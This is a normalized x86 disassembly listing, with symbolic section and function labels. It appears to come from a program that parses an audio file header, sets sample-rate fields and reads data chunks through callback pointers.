mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov edx [ r--data ]
mov [ eax + 0xc ] edx
mov ecx [ r--data ]
mov [ eax + 0x10 ] ecx
mov dx [ r--data ]
mov [ eax + 0x14 ] dx
xor eax eax
pop ebp
add esp 0xc
retn
mov ecx [ ebp + 0x70 ]
mov eax [ ebp + 0x74 ]
mov ecx [ ecx ]
push esi
push 0x1
lea edx [ esp + 0x17 ]
push edx
push eax
call ecx
add esp 0xc
cmp eax 0x1
jne r-xdata
mov ecx [ ebp + 0x70 ]
mov edx [ ebp + 0x74 ]
mov eax [ ecx + 0x18 ]
push edx
call eax
add esp 0x4
test eax eax
je r-xdata
mov edi [ esp + 0x2c ]
mov ecx 0x8
mov esi r--data
push ebp
[ edi ] [ esi ]
call sub_404b30
add esp 0x4
pop esi
pop edi
pop ebx
pop ebp
add esp 0xc
retn
movzx eax [ esp + 0x13 ]
mov edx [ ebp + 0x70 ]
mov ecx [ ebp + 0x74 ]
mov edx [ edx + 0x10 ]
push eax
push ecx
call edx
add esp 0x8
cmp [ esp + 0x13 ] 0x52
jne r-xdata
mov edi ebp
call sub_403da0
mov ecx [ ebp + 0x70 ]
mov edx [ ebp + 0x74 ]
mov eax [ ecx + 0x8 ]
push 0x0
push edx
call eax
add esp 0x8
push 0x758
call sub_40fe88
mov esi eax
push 0x758
push 0x0
push esi
mov [ esp + 0x24 ] esi
mov [ ebp + 0x17c ] esi
mov [ ebp + 0x174 ] 0x1
call sub_40fb30
add esp 0x10
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov eax [ esp + 0x2c ]
push eax
push ebp
call sub_405200
add esp 0x8
pop esi
pop edi
pop ebx
pop ebp
add esp 0xc
retn
mov [ ebp + 0x14 ] 0x0
mov eax [ esi + 0x18 ]
and eax 0xff
or [ ebp + 0x14 ] eax
mov ecx [ esi + 0x18 ]
and ecx 0x3
add ecx 0x1
mov [ ebp + 0xc ] ecx
movzx edx [ esi + 0x11f ]
add ecx ecx
mov [ ebp + 0x20 ] edx
mov eax [ esi + 0x18 ]
add ecx ecx
shr eax 0xd
and eax 0x1f
add ecx ecx
sub ecx eax
cmp [ ebp + 0x2c ] 0x0
mov [ ebp + 0x8 ] ecx
jne r-xdata
lea ebx [ ebx ]
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov edi [ esp + 0x2c ]
mov ecx 0xc
mov esi r--data
[ edi ] [ esi ]
push ebp
movsw [ edi ] [ esi ]
call sub_404b30
add esp 0x4
pop esi
pop edi
pop ebx
pop ebp
add esp 0xc
retn
xor ebx ebx
cmp [ esi + 0x14 ] ebx
jne r-xdata
test bl 0x8
je r-xdata
mov eax [ esi + 0x18 ]
and al 0x4
neg al
mov ecx 0x5
sbb eax eax
add eax 0x2
sub ecx eax
mov [ ebp + 0x1c ] eax
mov [ ebp + 0x30 ] ecx
mov [ ebp + 0x2c ] 0xac44
mov eax [ esi + 0x18 ]
mov edx eax
and edx 0x7800000
cmp edx 0x7800000
je r-xdata
add [ ebp + 0x84 ] eax
mov eax [ esi + 0x4 ]
add eax 0x8
push eax
call sub_40fe88
mov [ esi + 0x6c ] eax
mov edi eax
mov ecx 0x8
[ edi ] [ esi ]
mov esi [ esp + 0x18 ]
mov edx [ esi + 0x4 ]
mov eax [ esi + 0x6c ]
mov ecx [ ebp + 0x70 ]
sub edx 0x18
push edx
mov edx [ ebp + 0x74 ]
add eax 0x20
push eax
mov eax [ ecx ]
push edx
call eax
mov ecx [ esi + 0x4 ]
sub ecx 0x18
add esp 0x10
cmp eax ecx
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx ecx
add ecx 0x1
cmp edx 0x10
mov [ esp + 0x18 ] ecx
jg r-xdata
pop esi
pop edi
pop ebx
mov eax ebp
pop ebp
add esp 0xc
retn
mov esi [ esi + 0x18 ]
test esi 0x1000
jne r-xdata
shr eax 0x17
and eax 0xf
mov eax [ eax * 4 + r--data ]
mov [ ebp + 0x2c ] eax
jmp r-xdata
cmp [ esi + 0x14 ] ebx
mov [ esi + 0x10c ] ebx
je r-xdata
mov edx esi
and dl 0x4
neg dl
sbb edx edx
add edx 0x2
mov [ ebp + 0xa4 ] edx
mov eax [ ebp + 0x78 ]
cmp eax ebx
je r-xdata
test [ esp + 0x30 ] 0x20
jne r-xdata
cmp [ ebp + 0x98 ] ebx
je r-xdata
cmp [ esi + 0x14 ] ebx
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax ebx
jne r-xdata
cmp [ esi + 0x10c ] ebx
jne r-xdata
push ebp
call sub_403bb0
add esp 0x4
test eax eax
je r-xdata
test [ esi + 0x18 ] 0x8
je r-xdata
mov [ ebp + 0xbc ] eax
mov [ esi + 0x10 ] ebx
mov edx [ ebp + 0x70 ]
mov eax [ ebp + 0x74 ]
mov ecx [ edx + 0x18 ]
push eax
call ecx
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
cmp ecx 0xffffffff
je r-xdata
mov [ esi + 0x10c ] 0x1
cmp [ esi + 0x14 ] ebx
mov esi [ esp + 0x14 ]
je r-xdata
push ebp
call sub_409770
add esp 0x4
test eax eax
je r-xdata
mov edi [ esp + 0x2c ]
mov ecx 0xd
mov esi r--data
[ edi ] [ esi ]
push ebp
movsb [ edi ] [ esi ]
call sub_404b30
add esp 0x4
pop esi
pop edi
pop ebx
pop ebp
add esp 0xc
retn
mov ecx [ ebp + 0x70 ]
mov edx [ ecx + 0x14 ]
push eax
call edx
add esp 0x4
mov [ ebp + 0x80 ] eax
mov [ ebp + 0x98 ] 0x1
mov edx [ ebp + 0x70 ]
mov eax [ ebp + 0x74 ]
mov ecx [ edx + 0x4 ]
push eax
call ecx
mov edx [ ebp + 0x74 ]
mov edi eax
mov eax [ ebp + 0x70 ]
push edx
push eax
call sub_403ab0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov [ ebp + 0x8c ] ecx
jmp r-xdata
mov ecx [ ebp + 0x70 ]
mov edx [ ebp + 0x74 ]
mov eax [ ecx + 0x4 ]
push edx
call eax
mov ecx [ ebp + 0x70 ]
mov ebx [ ebp + 0x74 ]
push esi
push ecx
mov [ ebp + 0x84 ] eax
call sub_4039b0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov ebx [ esp + 0x30 ]
cmp [ ebp + 0x1a0 ] bl
lea ecx [ ebp + 0x1a0 ]
jne r-xdata
mov ecx [ ebp + 0x70 ]
mov edx [ ebp + 0x74 ]
mov eax [ ecx + 0x8 ]
push edi
push edx
call eax
add esp 0x8
sub eax [ ebp + 0xbc ]
mov [ ebp + 0x8c ] eax
mov edx [ esp + 0x2c ]
mov ecx r--data
mov al [ ecx ]
mov [ edx ] al
add ecx 0x1
add edx 0x1
cmp al bl
jne r-xdata
push ebp
call sub_404b30
add esp 0x4
pop esi
pop edi
pop ebx
pop ebp
add esp 0xc
retn
sub_405050
mov eax [ esp + 0xc ]
push ebx
mov ebx [ esp + 0x8 ]
add ebx 0xc8
test eax eax
push edi
mov edi [ esp + 0x18 ]
je r-xdata
cmp [ ebx + 0x84 ] 0x41
jne r-xdata
test edi edi
je r-xdata
cmp [ ebx + 0x4 ] 0x54
jne r-xdata
push edi
push eax
mov eax [ esp + 0x18 ]
push eax
mov eax ebx
call sub_403340
add esp 0xc
pop edi
pop ebx
retn
mov [ eax ] 0x0
pop edi
xor eax eax
pop ebx
retn
mov ecx [ esp + 0x10 ]
push ecx
call sub_404830
add esp 0x4
pop edi
pop ebx
retn
sub_4050b0
push ebx
push esi
push edi
mov edi [ esp + 0x18 ]
and edi 0x40
mov eax r--data
jne r-xdata
mov esi [ esp + 0x10 ]
cmp [ esi ] 0x2d
jne r-xdata
mov eax r--data
push eax
push esi
call sub_40f84d
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
call sub_40e4b7
push 0x8000
mov ebx eax
call sub_40e4b7
push eax
call sub_40ebab
add esp 0x4
push eax
call sub_411502
add esp 0x8
call sub_40e4b7
cmp ebx eax
je r-xdata
test edi edi
mov ecx r--data
jne r-xdata
xor esi esi
test [ esp + 0x18 ] 0x1
je r-xdata
mov edx [ esp + 0x14 ]
mov ecx r--data
mov [ edi + 0xac ] 0x1
test ebx ebx
je r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
mov al [ ecx ]
mov [ edx ] al
add ecx 0x1
add edx 0x1
test al al
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
test esi esi
je r-xdata
push ebx
call sub_40f0ed
add esp 0x4
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
add eax 0xa
push ebp
push eax
call sub_40fe88
mov ebp eax
mov edx ebp
add esp 0x4
mov eax esi
sub edx esi
mov eax edi
pop edi
pop esi
pop ebx
retn
push esi
call sub_40f0ed
add esp 0x4
mov eax edi
pop edi
pop esi
pop ebx
retn
mov cl [ eax ]
mov [ edx + eax ] cl
add eax 0x1
test cl cl
jne r-xdata
mov edi ebp
add edi 0xffffffff
mov al [ edi + 0x1 ]
add edi 0x1
test al al
jne r-xdata
mov ax [ r--data ]
push r--data
push ebp
mov [ edi ] ax
call sub_40f84d
push ebp
mov esi eax
call sub_40fdab
add esp 0xc
pop ebp
jmp r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
push ecx
push edx
push eax
push esi
push ebx
push rw-data
call sub_404be0
mov edi eax
add esp 0x18
test edi edi
jne r-xdata
sub_405200
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
push ebx
push esi
push edi
push 0xffc
call sub_40fe88
mov ebx [ ebp + 0x8 ]
push 0xffc
push 0x0
push eax
mov [ esp + 0x20 ] eax
mov [ ebx + 0x19c ] eax
call sub_40fb30
mov eax [ ebx + 0x70 ]
mov edx [ ebx + 0x74 ]
mov eax [ eax ]
push 0xc
lea ecx [ esp + 0x30 ]
push ecx
push edx
call eax
add esp 0x1c
cmp eax 0xc
jne r-xdata
mov edi [ ebp + 0xc ]
mov ecx 0x6
mov esi r--data
[ edi ] [ esi ]
push ebx
movsw [ edi ] [ esi ]
call sub_404b30
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x4
lea ecx [ esp + 0x20 ]
push r--data
push ecx
call sub_411354
add esp 0xc
test eax eax
jne r-xdata
push 0x4
lea edx [ esp + 0x28 ]
push r--data
push edx
call sub_411354
add esp 0xc
test eax eax
jne r-xdata
test [ ebx + 0x9c ] 0x4
je r-xdata
mov edx [ ebx + 0x70 ]
mov ecx [ ebx + 0x74 ]
mov edx [ edx ]
push 0x8
lea eax [ esp + 0x18 ]
push eax
push ecx
call edx
add esp 0xc
cmp eax 0x8
jne r-xdata
push 0xc
mov [ ebx + 0x60 ] 0xc
call sub_40fe88
mov ecx [ esp + 0x20 ]
mov [ ebx + 0x5c ] eax
mov [ eax ] ecx
mov edx [ esp + 0x24 ]
mov [ eax + 0x4 ] edx
mov ecx [ esp + 0x28 ]
add esp 0x4
mov [ eax + 0x8 ] ecx
test [ ebx + 0x9c ] 0x4
je r-xdata
lea eax [ esp + 0x14 ]
push r--data
push eax
call sub_4093e0
push 0x4
lea ecx [ esp + 0x20 ]
push r--data
push ecx
call sub_411354
add esp 0x14
test eax eax
jne r-xdata
mov eax [ ebx + 0x60 ]
mov ecx [ ebx + 0x5c ]
add eax 0x8
push eax
push ecx
call sub_41026d
mov ecx [ ebx + 0x60 ]
mov edx [ esp + 0x1c ]
mov [ ebx + 0x5c ] eax
mov [ ecx + eax ] edx
mov edx [ esp + 0x20 ]
add esp 0x8
mov [ ecx + eax + 0x4 ] edx
add [ ebx + 0x60 ] 0x8
push 0x4
lea edx [ esp + 0x18 ]
push r--data
push edx
call sub_411354
add esp 0xc
test eax eax
je r-xdata
mov edi 0x10
cmp [ esp + 0x18 ] edi
jb r-xdata
movzx ecx [ esp + 0x2a ]
mov eax [ esp + 0x18 ]
xor edx edx
div ecx
mov dx 0x10
cmp dx [ esp + 0x36 ]
push 0xa
sbb ecx ecx
neg ecx
xor edx edx
add ecx 0x2
div ecx
mov edx [ ebx + 0x70 ]
mov ecx [ ebx + 0x74 ]
mov [ ebx + 0x8c ] eax
mov edx [ edx ]
lea eax [ esp + 0x40 ]
push eax
push ecx
call edx
add esp 0xc
cmp eax 0xa
jne r-xdata
mov esi [ esp + 0x18 ]
add esi 0x1
and esi 0xfffffffe
je r-xdata
mov edx [ ebx + 0x70 ]
mov ecx [ ebx + 0x74 ]
mov edx [ edx ]
push edi
lea eax [ esp + 0x2c ]
push eax
push ecx
call edx
add esp 0xc
cmp eax edi
jne r-xdata
cmp [ esp + 0x44 ] 0x2
jne r-xdata
mov edx [ ebx + 0x70 ]
mov ecx [ ebx + 0x74 ]
mov edx [ edx ]
push 0x8
lea eax [ esp + 0x18 ]
push eax
push ecx
call edx
add esp 0xc
cmp eax 0x8
je r-xdata
test [ ebx + 0x9c ] 0x4
je r-xdata
test [ ebx + 0x9c ] 0x4
je r-xdata
cmp [ esp + 0x44 ] 0x3
jne r-xdata
mov eax [ ebx + 0x70 ]
mov edx [ ebx + 0x74 ]
mov eax [ eax ]
push 0x2
lea ecx [ esp + 0x4a ]
push ecx
push edx
call eax
add esp 0xc
cmp eax 0x2
jne r-xdata
push esi
call sub_40fe88
mov edx [ ebx + 0x70 ]
mov ecx [ edx ]
mov edi eax
mov eax [ ebx + 0x74 ]
push esi
push edi
push eax
call ecx
push edi
call sub_40fdab
add esp 0x14
mov eax [ ebx + 0x60 ]
mov ecx [ ebx + 0x5c ]
add eax esi
push eax
push ecx
call sub_41026d
mov ecx [ ebx + 0x60 ]
mov edx [ ebx + 0x70 ]
add ecx eax
mov [ ebx + 0x5c ] eax
mov eax [ ebx + 0x74 ]
push esi
push ecx
mov ecx [ edx ]
push eax
call ecx
add esp 0x14
add [ ebx + 0x60 ] esi
jmp r-xdata
lea ecx [ esp + 0x28 ]
push r--data
push ecx
call sub_4093e0
mov esi [ esp + 0x20 ]
add esp 0x8
cmp esi edi
jbe r-xdata
mov eax [ ebx + 0x60 ]
mov ecx [ ebx + 0x5c ]
add eax edi
push eax
push ecx
call sub_41026d
mov ecx [ ebx + 0x60 ]
mov edx [ esp + 0x30 ]
add ecx eax
mov [ ebx + 0x5c ] eax
mov [ ecx ] edx
mov eax [ esp + 0x34 ]
mov [ ecx + 0x4 ] eax
mov edx [ esp + 0x38 ]
mov [ ecx + 0x8 ] edx
mov eax [ esp + 0x3c ]
add esp 0x8
mov [ ecx + 0xc ] eax
add [ ebx + 0x60 ] edi
lea edx [ esp + 0x3c ]
push r--data
push edx
call sub_4093e0
push 0x4
lea eax [ esp + 0x48 ]
push r--data
push eax
call sub_411354
add esp 0x14
test eax eax
jne r-xdata
mov ecx [ ebx + 0x70 ]
mov eax [ ebx + 0x74 ]
mov ecx [ ecx ]
push 0x1a
lea edx [ esp + 0x4a ]
push edx
push eax
call ecx
add esp 0xc
cmp eax 0x1a
jne r-xdata
add esi 0xfffffff1
and esi 0xfffffffe
test [ ebx + 0x9c ] 0x4
je r-xdata
mov ecx [ esp + 0x44 ]
add ecx 0xffffffff
cmp cx 0x2
ja r-xdata
mov edx [ ebx + 0x60 ]
mov eax [ ebx + 0x5c ]
add edx esi
push edx
push eax
call sub_41026d
mov edx [ ebx + 0x60 ]
mov ecx [ ebx + 0x70 ]
add edx eax
mov [ ebx + 0x5c ] eax
mov eax [ ebx + 0x74 ]
mov ecx [ ecx ]
push esi
push edx
push eax
call ecx
add esp 0x14
add [ ebx + 0x60 ] esi
jmp r-xdata
mov si [ esp + 0x44 ]
cmp si 0x3
mov dx [ esp + 0x46 ]
mov ecx [ esp + 0x48 ]
jne r-xdata
mov eax [ ebx + 0x78 ]
test eax eax
je r-xdata
test ecx 0x8000
je r-xdata
and [ esp + 0x48 ] 0xff7f
cmp si 0x3
jne r-xdata
and [ esp + 0x48 ] 0xefff
test ecx 0x288
jne r-xdata
mov ecx [ esp + 0x2c ]
mov [ ebx + 0x2c ] ecx
movzx eax ax
mov ecx 0x5
sub ecx eax
mov [ ebx + 0x30 ] ecx
mov cl [ esp + 0x48 ]
test cl 0x1
mov [ ebx + 0x1c ] eax
je r-xdata
mov ecx [ ebx + 0x8c ]
mov [ esp + 0x4c ] ecx
xor ecx ecx
cmp ax 0x1
sete cl
mov [ esp + 0x48 ] cx
mov ecx 0x10
sub ecx edi
cmp si 0x1
mov [ esp + 0x4a ] cx
jne r-xdata
test dx dx
je r-xdata
test dx dx
je r-xdata
mov eax [ esp + 0x48 ]
test eax 0x8000
je r-xdata
or [ ebx + 0x14 ] 0x4
xor dx dx
mov [ esp + 0x46 ] dx
test ecx 0x400
je r-xdata
test ecx 0x800
je r-xdata
test ecx 0x400
je r-xdata
test dx dx
je r-xdata
or [ ebx + 0x14 ] 0x800
mov edx [ ebx + 0x70 ]
push eax
mov eax [ edx + 0x14 ]
call eax
mov dx [ esp + 0x4a ]
mov si [ esp + 0x48 ]
add esp 0x4
or [ esp + 0x48 ] 0x80
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x98 ] 0x1
jmp r-xdata
and [ esp + 0x48 ] 0x77ff
jmp r-xdata
test ecx 0x1000
jne r-xdata
test cl 0x12
jne r-xdata
test cl 0x10
jne r-xdata
test eax 0x400
je r-xdata
cmp si 0x3
mov edi [ esp + 0x36 ]
mov ax [ esp + 0x2a ]
jge r-xdata
mov ecx [ esp + 0x48 ]
and eax 0x20
movzx edx di
mov edi [ esp + 0x10 ]
or eax 0x40
shr eax 0x5
mov [ ebx + 0xc ] eax
mov eax [ esp + 0x10 ]
mov [ ebx + 0x8 ] edx
mov ecx 0x9
lea esi [ esp + 0x3c ]
[ edi ] [ esi ]
mov ecx 0x100000
pop edi
mov [ eax + 0x60 ] ecx
mov [ eax + 0x34 ] ecx
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
or [ ebx + 0x14 ] 0x200
or [ ebx + 0x14 ] 0x1000000
jmp r-xdata
or [ ebx + 0x14 ] 0x8
jmp r-xdata
sub_405730
push esi
mov esi [ esp + 0x8 ]
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x4 ]
mov eax [ esi + 0x1c ]
push ecx
mov ecx [ esi + 0x28 ]
push edx
mov edx [ eax ]
push ecx
call edx
mov ecx [ esi + 0x4 ]
add [ esi + 0x14 ] eax
lea edx [ ecx + eax ]
add esp 0xc
cmp edx ecx
mov [ esi + 0x8 ] edx
jne r-xdata
mov eax ecx
mov [ esi + 0xc ] eax
pop esi
retn
mov eax [ esi + 0x10 ]
push eax
push 0xffffffff
push ecx
call sub_40fb30
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x4 ]
add esp 0xc
add [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
pop esi
retn
sub_405780
mov [ esi + 0x28 ] eax
mov [ esi + 0x1c ] ecx
push eax
mov eax [ ecx + 0x4 ]
call eax
add esp 0x4
cmp [ esi + 0x4 ] 0x0
mov [ esi + 0x14 ] eax
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ esi + 0x10 ]
lea ecx [ edx + eax ]
mov [ esi + 0x8 ] ecx
add ecx 0xffffffff
mov [ esi + 0xc ] ecx
xor ecx ecx
test eax eax
sete cl
mov [ esi + 0x24 ] 0x0
mov [ esi + 0x18 ] 0x0
mov [ esi ] sub_405730
mov eax ecx
mov [ esi + 0x20 ] eax
retn
mov ecx [ esi + 0x10 ]
push ecx
call sub_40fe88
add esp 0x4
mov [ esi + 0x4 ] eax
sub_4057e0
movsx edx [ ecx + 0xc ]
test dl dl
mov eax 0x2c
jns r-xdata
cmp [ ecx + 0x8 ] 0x3
jne r-xdata
mov eax 0x58
add eax 0x14
cmp [ ecx + 0xa ] 0x0
je r-xdata
add eax 0x10
add eax 0x8
jmp r-xdata
add eax 0x34
add eax 0x10
jmp r-xdata
add eax 0x1c
add eax 0x10
jmp r-xdata
test edx 0x8000
jne r-xdata
add eax 0x8
test dl 0x40
je r-xdata
cmp [ ecx + 0xa ] 0x0
je r-xdata
test edx 0x410
je r-xdata
add eax 0x18
retn
push esi
mov esi [ ecx + 0x80 ]
test esi esi
push edi
lea edi [ ecx + 0x8cc ]
je r-xdata
pop edi
pop esi
nop
add eax 0x10
test dl 0x1
lea eax [ eax + ecx * 4 + 0x4 ]
jne r-xdata
mov ecx [ edi ]
sub esi 0x1
test ecx ecx
jle r-xdata
add edi 0x60
test esi esi
jne r-xdata
lea eax [ eax + ecx * 4 + 0x4 ]
jmp r-xdata
sub_405880
push ebp
mov ebp [ esp + 0x8 ]
movsx edx [ ebp + 0xc ]
push esi
push edi
mov edi eax
lea esi [ ebp + 0x24 ]
mov ecx 0xb
add eax 0x2c
test dl dl
mov [ esp + 0x10 ] edx
[ edi ] [ esi ]
jns r-xdata
cmp [ ebp + 0x8 ] 0x3
jne r-xdata
mov edi eax
lea esi [ ebp + 0x50 ]
mov ecx 0xb
[ edi ] [ esi ]
add eax 0x2c
mov ecx [ ebp + 0xfc0 ]
mov [ eax ] ecx
mov ecx [ ebp + 0xfc4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xfc8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0xfcc ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp + 0xfd0 ]
mov [ eax + 0x10 ] ecx
add eax 0x14
cmp [ ebp + 0xa ] 0x0
mov edi eax
je r-xdata
mov ecx [ ebp + 0x88c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x890 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x894 ]
add eax 0x4
add eax 0x4
mov [ eax ] ecx
mov ecx [ ebp + 0x898 ]
add eax 0x4
mov [ eax ] ecx
add eax 0x4
mov ecx [ ebp + 0x8a8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8ac ]
mov [ eax + 0x4 ] ecx
add eax 0x8
jmp r-xdata
lea esi [ ebp + 0xf8c ]
mov ecx 0xd
add eax 0x34
lea esi [ ebp + 0xfe0 ]
mov ecx 0x7
add eax 0x1c
jmp r-xdata
test edx 0x8000
jne r-xdata
mov ecx [ ebp + 0x89c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8a0 ]
add eax 0x4
mov [ eax ] ecx
add eax 0x4
test dl 0x40
je r-xdata
cmp [ ebp + 0xa ] 0x0
je r-xdata
[ edi ] [ esi ]
mov ecx [ ebp + 0xfd4 ]
mov [ eax ] ecx
mov ecx [ ebp + 0xfd8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xfdc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8b0 ]
add eax 0xc
mov [ eax ] ecx
add eax 0x4
jmp r-xdata
test edx 0x410
je r-xdata
mov ecx [ ebp + 0x8b4 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8b8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x8bc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8c0 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp + 0x8c4 ]
add eax 0x10
mov [ eax ] ecx
mov ecx [ ebp + 0x8c8 ]
mov [ eax + 0x4 ] ecx
add eax 0x8
pop edi
pop esi
pop ebp
retn
mov edi [ ebp + 0x80 ]
test edi edi
lea ecx [ ebp + 0x8cc ]
je r-xdata
push ebx
mov edx [ ecx + 0x8 ]
mov [ eax ] edx
mov edx [ ecx + 0xc ]
mov [ eax + 0x4 ] edx
mov edx [ ecx + 0x10 ]
add eax 0x4
add eax 0x4
mov [ eax ] edx
mov edx [ ecx + 0x30 ]
add eax 0x4
mov [ eax ] edx
add eax 0x4
mov ebx [ ecx + 0x8 ]
mov edx [ ebp + 0x8a4 ]
mov [ eax ] ebx
add eax 0x4
test esi esi
je r-xdata
mov esi [ ecx ]
sub edi 0x1
test esi esi
jle r-xdata
pop ebx
test [ esp + 0x14 ] 0x1
jne r-xdata
lea ecx [ ecx ]
add ecx 0x60
test edi edi
jne r-xdata
mov esi [ ecx ]
mov ebx [ ecx + 0xc ]
mov edx [ ebp + 0x8a4 ]
mov [ eax ] ebx
add eax 0x4
test esi esi
je r-xdata
mov ebx [ ecx + edx * 4 + 0x10 ]
add edx 0x1
sub esi 0x1
mov [ eax ] ebx
add eax 0x4
and edx 0x7
test esi esi
jne r-xdata
mov ebx [ ecx + edx * 4 + 0x30 ]
add edx 0x1
sub esi 0x1
mov [ eax ] ebx
add eax 0x4
and edx 0x7
test esi esi
jne r-xdata
jmp r-xdata
sub_405aa0
push 0x34
lea eax [ esi + 0xf8c ]
push 0x0
push eax
call sub_40fb30
xor eax eax
mov [ esi + 0xfc0 ] eax
mov [ esi + 0xfc4 ] eax
mov [ esi + 0xfc8 ] eax
mov [ esi + 0xfcc ] eax
mov [ esi + 0xfd0 ] eax
mov [ esi + 0xfd4 ] eax
mov [ esi + 0xfd8 ] eax
mov [ esi + 0xfdc ] eax
mov [ esi + 0xfe0 ] eax
mov [ esi + 0xfe4 ] eax
mov [ esi + 0xfe8 ] eax
mov [ esi + 0xfec ] eax
mov [ esi + 0xff0 ] eax
mov [ esi + 0xff4 ] eax
add esp 0xc
mov [ esi + 0xff8 ] eax
test [ esi + 0xc ] 0x1
je r-xdata
movsx eax [ esi + 0xa ]
cdq
sub eax edx
sar eax 0x1
sub eax 0x300
mov [ esi + 0xff8 ] eax
retn
movsx ecx [ esi + 0xa ]
sub ecx 0x300
mov [ esi + 0xff8 ] ecx
retn
sub_405b40
movzx eax [ esi + 0xc ]
sub esp 0x8
test eax 0x8000
push ebx
push ebp
push edi
mov ebp 0x1
mov ecx 0x20
je r-xdata
xor ebp ebp
mov edi 0x1
mov ebx 0x7
test al 0x40
jne r-xdata
add [ esi + 0x30 ] edi
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
mov eax [ esi + 0xfa4 ]
test eax eax
je r-xdata
mov edx [ esi + 0x30 ]
mov [ esi + 0x48 ] ebx
movzx eax [ edx ]
mov [ esi + 0x3c ] eax
mov ecx [ esi + 0x24 ]
lea eax [ esi + 0x24 ]
push eax
call ecx
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax edi
test eax eax
je r-xdata
cmp [ esi + 0xfa8 ] ecx
jae r-xdata
add eax 0xffffffff
mov [ esi + 0xfa4 ] eax
je r-xdata
cmp ebp 0x19
mov [ esp + 0xc ] ebp
je r-xdata
add ebp edi
cmp ebp 0x19
jb r-xdata
cmp [ esi + 0xfac ] ecx
jae r-xdata
pop edi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn 0x4
pop edi
pop ebp
mov eax 0x80000000
pop ebx
add esp 0x8
retn 0x4
mov eax [ esp + 0x18 ]
mov eax [ esi + eax * 4 + 0xfa8 ]
mov ecx eax
shr ecx 0x3
lea eax [ ecx + eax + 0x40 ]
shr eax 0x7
cmp eax 0x100
mov edi 0x18
jge r-xdata
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
xor ebx ebx
cmp eax 0x10000
jge r-xdata
movsx ebx [ eax + r--data ]
jmp r-xdata
add [ esi + 0x30 ] ebp
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x48 ] eax
mov eax [ esi + 0x3c ]
jmp r-xdata
cmp eax 0x1000000
jge r-xdata
sar eax 0x8
movsx ebx [ eax + r--data ]
add ebx 0x8
jmp r-xdata
test ebp ebp
jne r-xdata
mov ecx [ esi + 0x30 ]
mov [ esi + 0x48 ] 0x7
movzx eax [ ecx ]
mov [ esi + 0x3c ] eax
lea eax [ esi + 0x24 ]
push eax
mov eax [ eax ]
call eax
add esp 0x4
shr [ esi + 0x3c ] 0x1
and eax ebp
test eax eax
je r-xdata
sar eax 0x18
movsx ebx [ eax + r--data ]
add ebx edi
sar eax 0x10
movsx ebx [ eax + r--data ]
add ebx 0x10
jmp r-xdata
mov eax [ ebx * 4 + r--data ]
mov ecx [ esp + 0x18 ]
mov [ esp + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xfb0 ]
mov edx eax
shr edx 0x4
lea eax [ edx + eax + 0x20 ]
shr eax 0x6
cmp eax 0x100
jge r-xdata
cmp ebx [ esi + 0x48 ]
jle r-xdata
cmp ebx 0x21
jne r-xdata
add ebx ebp
cmp ebx 0x21
jl r-xdata
cmp eax 0x10000
jge r-xdata
movsx ebx [ eax + r--data ]
jmp r-xdata
mov eax [ esi + 0x48 ]
cmp eax 0x20
mov edi [ esi + 0x3c ]
jle r-xdata
add [ esi + 0x30 ] 0x1
mov eax [ esi + 0x30 ]
cmp eax [ esi + 0x2c ]
jne r-xdata
cmp ebx 0x2
jge r-xdata
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
cmp eax 0x1000000
jge r-xdata
sar eax 0x8
movsx ebx [ eax + r--data ]
add ebx 0x8
jmp r-xdata
cmp ebp 0x1
jne r-xdata
sub eax ebx
mov ecx ebx
shr [ esi + 0x3c ] cl
mov [ esi + 0x48 ] eax
and edi [ ebx * 4 + r--data ]
jmp r-xdata
mov ecx [ esi + 0x30 ]
sub eax ebx
mov [ esi + 0x48 ] eax
movzx edx [ ecx ]
mov ecx 0x8
sub cl al
shr edx cl
mov [ esi + 0x3c ] edx
and edi [ ebx * 4 + r--data ]
jmp r-xdata
mov eax [ esi + 0x30 ]
movzx edx [ eax ]
mov ecx [ esi + 0x48 ]
shl edx cl
add ecx 0x8
